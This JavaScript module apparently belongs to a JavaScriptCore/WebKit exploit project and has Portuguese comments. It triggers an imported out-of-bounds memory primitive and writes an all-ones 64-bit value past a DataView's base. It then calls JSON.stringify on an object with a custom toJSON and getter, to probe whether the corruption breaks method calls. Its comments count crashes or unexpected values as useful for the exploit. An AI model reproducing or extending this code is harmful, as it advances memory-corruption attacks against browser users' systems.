// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

const GETTER_CHECKPOINT_PROPERTY_NAME = "AAAA_GetterForMethodCallTest";
let getter_called_flag = false;
let current_test_results = { success: false, message: "Teste não iniciado.", error: null, details: "" };

const CORRUPTION_OFFSET = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
const CORRUPTION_VALUE = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);

class CheckpointWithMethod {
    constructor(id) {
        this.id_marker = `CheckpointWithMethod-${id}`;
        this.data = 0x12345678;
    }

    // Método que vamos tentar chamar no getter
    performAction() {
        logS3(`CheckpointWithMethod.performAction CALLED! Data: ${toHex(this.data)}`, "good", "performAction");
        return this.data + 1;
    }

    // Propriedade com getter que será acionada por toJSON
    get [GETTER_CHECKPOINT_PROPERTY_NAME]() {
        getter_called_flag = true;
        const FNAME_GETTER = "MethodCallTest_Getter";
        logS3(`Getter "${GETTER_CHECKPOINT_PROPERTY_NAME}" FOI CHAMADO em 'this' (id: ${this.id_marker})!`, "vuln", FNAME_GETTER);
        current_test_results = { success: false, message: "Getter chamado, tentando chamar this.performAction().", error: null, details: "" };

        try {
            logS3("DENTRO DO GETTER: Tentando chamar this.performAction()...", "info", FNAME_GETTER);
            const action_result = this.performAction(); // Chama o método no 'this'
            logS3(`DENTRO DO GETTER: this.performAction() retornou: ${toHex(action_result)} (Esperado: ${toHex(0x12345678 + 1)})`, "info", FNAME_GETTER);

            if (action_result === (0x12345678 + 1)) {
                current_test_results.message = "this.performAction() chamado com sucesso, objeto parece íntegro.";
                current_test_results.success = false; // Sucesso aqui significa que *não* houve corrupção útil para exploit
            } else {
                current_test_results.message = `this.performAction() retornou valor inesperado: ${toHex(action_result)}.`;
                current_test_results.success = true; // Resultado inesperado pode ser interessante
                logS3(`DENTRO DO GETTER: Resultado inesperado de performAction!`, "vuln", FNAME_GETTER);
            }
            current_test_results.details = `Resultado da ação: ${toHex(action_result)}`;

        } catch (e) {
            logS3(`DENTRO DO GETTER: ERRO ao chamar this.performAction(): ${e.message}`, "error", FNAME_GETTER);
            current_test_results.success = true; // Erro ao chamar método também é interessante
            current_test_results.error = String(e);
            current_test_results.message = `Erro ao chamar this.performAction(): ${e.message}`;
        }
        return 0xBADF00D; // Valor de retorno do getter
    }
}

// toJSON será agora um método do CheckpointWithMethod
CheckpointWithMethod.prototype.toJSON = function() {
    const FNAME_toJSON = "CheckpointWithMethod.toJSON";
    logS3(`toJSON para: ${this.id_marker}. Acessando getter para acionar lógica de teste...`, "info", FNAME_toJSON);
    // Acessar a propriedade com getter para acionar a lógica de teste
    // eslint-disable-next-line no-unused-vars
    const _ = this[GETTER_CHECKPOINT_PROPERTY_NAME];
    return { id: this.id_marker, custom_json: true }; // Retorno simples para JSON.stringify
};


export async function executeRetypeOOB_AB_Test() { // Nome da função exportada mantido
    const FNAME_TEST = "executeMethodCallTest"; // Nome interno
    logS3(`--- Iniciando Teste de Chamada de Método no Getter ---`, "test", FNAME_TEST);

    getter_called_flag = false;
    current_test_results = { success: false, message: "Teste não executado.", error: null, details: "" };

    if (!JSC_OFFSETS.ArrayBufferContents /* ... etc ... */) { /* ... validação ... */ return; }

    // Não precisamos mais poluir Object.prototype.toJSON ou o protótipo de CheckpointWithMethod aqui,
    // pois toJSON e o getter são definidos diretamente na classe/protótipo.

    try {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real || !oob_dataview_real) { /* ... erro ... */ return; }
        logS3(`Ambiente OOB inicializado. oob_ab_len: ${oob_array_buffer_real.byteLength}`, "info", FNAME_TEST);

        // 1. Realizar a escrita OOB "gatilho" no oob_array_buffer_real
        oob_write_absolute(CORRUPTION_OFFSET, CORRUPTION_VALUE, 8);
        logS3(`Escrita OOB gatilho em ${toHex(CORRUPTION_OFFSET)} do oob_data completada.`, "info", FNAME_TEST);

        // 2. Criar o objeto CheckpointWithMethod
        const checkpoint_obj_with_method = new CheckpointWithMethod(1);
        logS3(`CheckpointWithMethod objeto criado. ID: ${checkpoint_obj_with_method.id_marker}`, "info", FNAME_TEST);

        // 3. Chamar JSON.stringify
        logS3(`Chamando JSON.stringify(checkpoint_obj_with_method)...`, "info", FNAME_TEST);
        let stringify_result = null;
        try {
            stringify_result = JSON.stringify(checkpoint_obj_with_method);
            logS3(`JSON.stringify completado. Resultado: ${stringify_result}`, "info", FNAME_TEST);
        } catch (e) {
            logS3(`Erro JSON.stringify: ${e.message}`, "error", FNAME_TEST);
            if (!getter_called_flag) {
                 current_test_results.message = `Erro em JSON.stringify antes do getter: ${e.message}`;
                 current_test_results.error = String(e);
            }
        }

    } catch (mainError) {
        logS3(`Erro principal: ${mainError.message}`, "critical", FNAME_TEST);
        console.error(mainError);
        current_test_results = { success: false, message: `Erro crítico: ${mainError.message}`, error: String(mainError), details:"" };
    } finally {
        // Nenhuma poluição de protótipo global para limpar aqui,
        // mas poderíamos restaurar ComplexCheckpoint.prototype.toJSON/getter se quiséssemos ser ultra-limpos
        // para múltiplos testes na mesma página sem recarregar.
        logS3("Limpeza (se houver) finalizada.", "info", "CleanupFinal");
    }

    if (getter_called_flag) {
        if (current_test_results.success) {
            logS3(`RESULTADO TESTE CHAMADA MÉTODO: ${current_test_results.message}. Detalhes: ${current_test_results.details}`, "vuln", FNAME_TEST);
        } else {
            logS3(`RESULTADO TESTE CHAMADA MÉTODO: Getter chamado. ${current_test_results.message}. Detalhes: ${current_test_results.details}`, "warn", FNAME_TEST);
        }
    } else {
        logS3("RESULTADO TESTE CHAMADA MÉTODO: Getter NÃO foi chamado.", "error", FNAME_TEST);
    }
    // logS3(`  Detalhes finais JSON: ${JSON.stringify(current_test_results)}`, "info", FNAME_TEST);

    clearOOBEnvironment();
    logS3(`--- Teste de Chamada de Método no Getter Concluído ---`, "test", FNAME_TEST);
}
